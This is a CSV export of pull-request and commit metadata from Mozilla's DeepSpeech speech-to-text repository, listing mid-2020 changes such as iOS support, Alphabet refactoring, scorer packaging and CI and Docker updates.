770,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f568e77858c8bea93c67362b0f16c458bf481f7,Don't use BAZEL_OPT_FLAGS in iOS builds
771,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa8e9b064736c3c483391ccc62eacf61eb8bd472,Use correct build flags for ARM64 vs x86_64
772,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0f4b0ddc17317c4f809898265eb6f422dfc328f,Remove even more bazel flags
773,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,be43b3fdc1ba0636e9a716a796d2ebb117485957,Bump caches for artifacts rebuilt on new worker
774,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,de7a249fcd9c7e5f3eebdee4357626d8098569d9,Fix linker issues during tests with new workers
775,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e5db17371f167c57ad8255e8324629acf1dea7d,Address review comments
776,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d9dac13343b634996e0875770b7cd70259e60060,Clean up tf_tc-build.sh
777,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3150,3150,iOS support,,reuben,477142,2020-07-11T17:12:42Z,MEMBER,True,2661,156,49,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,267287861867d581f500cfc748c30ea3501a9608,Add docs to Swift bindings and missing methods
778,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3149,3149,Update TRAINING.rst,"I'm new to DeepSpeech, but I noticed when following the training instructions that the filenames _appear_ to be relative paths in the CSV. Let me know if I'm misinterpreting.

Thanks!",karansag,1545121,2020-07-10T19:25:09Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,058f53af3ab66082b1e566c9e6c0c19e6c77020f,"Update TRAINING.rst

I'm new to DeepSpeech, but I noticed when following the training instructions that the filenames _appear_ to be relative paths in the CSV. Let me know if I'm misinterpreting.

Thanks!"
779,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3149,3149,Update TRAINING.rst,"I'm new to DeepSpeech, but I noticed when following the training instructions that the filenames _appear_ to be relative paths in the CSV. Let me know if I'm misinterpreting.

Thanks!",karansag,1545121,2020-07-10T19:25:09Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,36a2f3b38d7527e3603e96692f449b773a5b6fff,"Update TRAINING.rst

Update wording on relative / absolute paths."
780,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3147,3147,Resolves #3146 - Let build_sdb.py also output CSV files and rename it accordingly,,tilmankamp,5991088,2020-07-09T15:53:33Z,CONTRIBUTOR,True,198,98,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a982a61d838b80787b3486b8be314e40304e8584,Resolves #3146 - Let build_sdb.py also output CSV files and rename it accordingly
781,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3145,3145,Resolves #3144 - Add augmentation support to build_sdb.py,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2020-07-09T09:57:22Z,CONTRIBUTOR,True,18,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,61bd5dd88dd262a1fedc46a2e47668bef9eefa8b,Resolves #3144 - Add augmentation support to build_sdb.py
782,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3142,3142,Fix #3141: Add ElectronJS v9.1,,lissyx,1645737,2020-07-08T15:00:54Z,COLLABORATOR,True,134,31,38,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b832acb54b5e5ab56c6c192a8e6c0a625f36fc85,Fix #3141: Add ElectronJS v9.1
783,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3142,3142,Fix #3141: Add ElectronJS v9.1,,lissyx,1645737,2020-07-08T15:00:54Z,COLLABORATOR,True,134,31,38,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f953d12ba07d91cf592e017896f7bd7ea7161a1,Fix nasty regression on some build/cache tasks
784,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3140,3140,Add notes on impact of model inputs and reference training/fine-tuning/scorer docs from usage docs,,reuben,477142,2020-07-07T18:03:31Z,MEMBER,True,14,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,daf28086e58ffaa4e99b0b9343bb353ada3da036,Add note on model input data considerations and reference training/scorer docs
785,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3140,3140,Add notes on impact of model inputs and reference training/fine-tuning/scorer docs from usage docs,,reuben,477142,2020-07-07T18:03:31Z,MEMBER,True,14,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,672ce377ac6ee675c7deb4d0ef33194cf5102032,Only update examples submodule from remote
786,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3139,3139,Fix #3127: Adjust PATH for electronjs/windows with electron-builder,,lissyx,1645737,2020-07-07T17:18:21Z,COLLABORATOR,True,11,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48f904ac2739691f52faa1f8efc5b849cb8ec97e,Fix #3127: Adjust PATH for electronjs/windows with electron-builder
787,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3137,3137,Fix: #3130 - Missing deepspeech_training.util.text.Alphabet,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2020-07-07T15:07:19Z,CONTRIBUTOR,True,68,93,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,084da3724d0dc87eb8f74d87a6ab515e16d01e04,Fix: #3130 - Missing deepspeech_training.util.text.Alphabet
788,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3136,3136,Fix #3130: forward export Alphabet and UTF8Alphabet from util/text.py,,lissyx,1645737,2020-07-07T13:45:12Z,COLLABORATOR,False,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9a4126da7d8a2249300b2bda749f9602dc18a238,Fix #3130: forward export Alphabet and UTF8Alphabet from util/text.py
789,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3135,3135,Fix some style inconsistencies in Java bindings (Fixes #3121),,reuben,477142,2020-07-07T13:25:06Z,MEMBER,True,29,110,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,417b8e4fe3238fbc33570c8b0600ca23c88aedca,Fix style inconsistencies in Java bindings
790,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3135,3135,Fix some style inconsistencies in Java bindings (Fixes #3121),,reuben,477142,2020-07-07T13:25:06Z,MEMBER,True,29,110,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16f89dff9e5a999475d5096569a263fcc40d65da,Update Java docs
791,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3135,3135,Fix some style inconsistencies in Java bindings (Fixes #3121),,reuben,477142,2020-07-07T13:25:06Z,MEMBER,True,29,110,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2471b10c27d06765fa8446a872c594cb159e144c,Update Java tests
792,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3131,3131,Add methods to check for label presence in Alphabet,,reuben,477142,2020-07-06T17:34:47Z,MEMBER,True,50,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6dc7ba8c0fb52456586450bba6463934a908369,Add methods to check for label presence in Alphabet
793,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3125,3125,Fix some regressions from Alphabet refactoring (Fixes #3123),,reuben,477142,2020-07-04T09:29:31Z,MEMBER,True,40,9,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,30de5153bca9636d34bedbcc2f11e01b9b102799,Fix regressions in bytes output mode
794,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3125,3125,Fix some regressions from Alphabet refactoring (Fixes #3123),,reuben,477142,2020-07-04T09:29:31Z,MEMBER,True,40,9,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03ed4a45f8934e6fff3d81613e809dad636597c3,Don't add empty lines to Alphabet when parsing
795,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3124,3124,Update TRAINING.rst,Related to #3123,DanBmh,18572490,2020-07-03T15:09:45Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,91697ace49892619c3433d8e8582ec545fd92e09,"Update TRAINING.rst

Related to #3123"
796,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3118,3118,Add more doc text around distinction between various pre-trained model files (Fixes #2941),,reuben,477142,2020-06-30T18:02:42Z,MEMBER,True,17,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d0bd1e5c8eea0021fbc677a9e451fe0b4fc8d910,Add more doc text around distinction between various pre-trained model files
797,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3118,3118,Add more doc text around distinction between various pre-trained model files (Fixes #2941),,reuben,477142,2020-06-30T18:02:42Z,MEMBER,True,17,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5c41b8966ef040c0eef022f2bcc9d2d1afdaca50,"Fix broken link to C API docs

X-DeepSpeech: NOBUILD"
798,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3117,3117,"Name, tag and save docker image",,lissyx,1645737,2020-06-30T10:05:23Z,COLLABORATOR,True,34,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,436561b0e411607924a1be381f09ab87573d732d,Support for Docker Hub automated builds
799,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3116,3116,Set git remote origin before fetching,,lissyx,1645737,2020-06-29T22:53:42Z,COLLABORATOR,True,3,3,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f365576517009ea2de6d74ff859d8e8bcdef7037,Set git remote origin before fetching
800,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03ca94887c62cff6de755cd86d5b6c76c83fe1a0,Move DS_ErrorCodeToErrorMessage impl to its own object so it can be used without including all of libdeepspeech
801,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f82c77392de3e6dbf8c28471adb7db3b6ab83937,Rewrite data/lm/generate_package.py into native_client/generate_scorer_package.cpp
802,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a84abf813cd0cbc3257429aa44d00a3552f98f71,"Deduplicate Alphabet implementations, use C++ one everywhere"
803,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4a589dd8979f8415e1e0e88d08d06a34accaae8b,Build/package/publish generate_scorer_package in CI
804,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6618148e9bf0ec003ef4223cd136e6e205ac292f,Update tensorflow with Boost rules
805,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5039fb51d5437970df0648b228404506fed359bc,Package generate_scorer_package on Android
806,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2504360e95a24c7c475edf8bb84b49dadcb8b978,Handle universal newlines in Alphabet file parsing
807,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f6106b35d2b84af160227640390590a2dc4c3ef,Update docs to refer to new generate_scorer_package
808,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3113,3113,Rewrite generate_package.py in C++ to avoid training dependencies,,reuben,477142,2020-06-28T14:52:51Z,MEMBER,True,549,506,40,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,65915c7f57a1b39a36e8d5f8e28595251f1bd752,Address review comments
809,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3108,3108,Build kenlm in training container image.,,DanBmh,18572490,2020-06-26T13:15:21Z,CONTRIBUTOR,True,14,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,91b3db33c3f7db7d4968e196f8f1b45d38c95e5d,Build kenlm in training container image.
810,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3107,3107,Use TensorFlow as a submodule,,lissyx,1645737,2020-06-26T10:57:43Z,COLLABORATOR,True,1102,129,89,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,80ee63fac68354bf872693c3ad672427266ae737,Use TensorFlow as a submodule
811,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3103,3103,Enable TFLite delegations,,lissyx,1645737,2020-06-24T16:51:39Z,COLLABORATOR,True,213,85,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67004ca1377e22c2479053e82ce6d9c54321affb,Enable TFLite delegations
812,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3100,3100,Add UWP Nuget packing support,"Fixes #2937

First attempt, I think the uwp build will fail let's see.",carlfm01,32177100,2020-06-24T09:39:44Z,COLLABORATOR,True,57,104,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,48fb43c3eb22175db0c5a9f9337efefc906cea84,Add UWP Nuget packing support
813,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3098,3098,Bump VERSION to 0.9.0-dev.0,,lissyx,1645737,2020-06-23T17:28:40Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6d1f0c73ef1bcd0be648937d40910e8dadf6cfb3,Bump VERSION to 0.9.0-alpha.0
814,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e069b6d61f4e87ddd356fc965470549d3a6f19cf,"Add read only validation metrics

For now this is just CTC loss like a validation set, but without affecting
best validation checkpoint tracking logic. Eventually this could compute WER
on a smaller set, for example."
815,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,07d2c39138805d8eb15f481c4c5511a2cb89f895,Split SDB tests from basic training tests to speed up CI dependents
816,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ecd79531c8d27f95392a1e3b999e7c8d5f8a7d93,Add training test with --metrics_files
817,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bfaa68945a7c3ba5e25626b38fca7a1eeaff018f,"Merge pull request #3051 from mozilla/add-metrics-tracking

Add read-only metrics tracking"
818,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfc79799ecae723194e95aeb6a9b677cee322964,Report imported vs total audio time
819,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e99b938ebfb0634668553d00b0c9cded2503d234,"Merge pull request #3054 from lissyx/import-time

Report imported vs total audio time"
820,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d94db7ca43614854f782305cecb4c07f7d68ccb3,Refactoring of TF based augmentations
821,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c294d80a9312563de55bd77f570743927df04777,DOC: Fixed grammatical mistake.
822,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cbb9c28e2c176a0728d48443248cba5e8fe9a1e0,"Merge pull request #3062 from ObliviousParadigm/patch-1

DOC: Fixed grammatical mistake."
823,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d541394e86079a61781ba50ad61c99d3e6d1ea4,Decouple Dockerfile into build and train
824,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff83f1b8f44ce33a60e1662910c8e06aa66817a0,"Merge pull request #3060 from lissyx/docker-decouple

Decouple Dockerfile into build and train"
825,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0bec67d74cd546ec64c55c3eedb30d266934ef19,"Update bin/play.py

Co-authored-by: Reuben Morais <reuben.morais@gmail.com>"
826,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea21c7d24e7ae4336f3de4d9077f69b63e6f5568,"Apply suggestions from code review

Co-authored-by: Reuben Morais <reuben.morais@gmail.com>"
827,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5b6de213d8dc8893647261f38dcfaf454854225c,Follow-up on PR comments; removed warp augmentation; split pitch_and_tempo augmentation
828,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aeb4c5b10599acde1631583ec7433f8441f688b3,Fix #2942: Document supported platforms
829,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c839ab53551ee6bf2074b1def4d6be3053698585,"Merge pull request #3065 from lissyx/supported-platforms

Fix #2942: Document supported platforms"
830,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2d5dcc359a694d506057fbf048ecf7996e71a120,Tests for TF based value range picking
831,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a835bee5a8676eb173e1dce78f1958bdcc94a94,Updated training tests
832,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a28df45192e84aaaeebb9c8dad2094a0f9367b1a,Respect None case for augmentations list
833,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e10b807e92552bff498feba65d97417572e17a9b,Ignore generated dockerfiles.
834,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d538d80ddb0e007ca54324188cd72f03120837c3,"Merge pull request #3067 from DanBmh/update_ignore

Ignore generated dockerfiles"
835,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5dd08d2f8eec44705fe90c7ae351d202cf54d4df,Deactivated scorer in graph augmentation test
836,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6c2cbbd725928b4fba6e90d9bc7381bf3cc28911,Fix #3053: Check output stream when producing scorer
837,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7768c89e2a8d4dd99f93cb702a3e44bbc415f1f9,Fix #3073: Update libssl version
838,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1353892b4ce680bda17faba9ffede9a6d294c04,"Merge pull request #3074 from lissyx/fix-ssl

Fix #3073: Update libssl version"
839,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3097,3097,Update 0.8,,lissyx,1645737,2020-06-23T16:51:45Z,COLLABORATOR,True,1763,1730,148,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4f7842c96657c24c3bc3f0e7cb6ae9efd848e15a,Fix #3068: More generic TaskCluster build/caching tasks
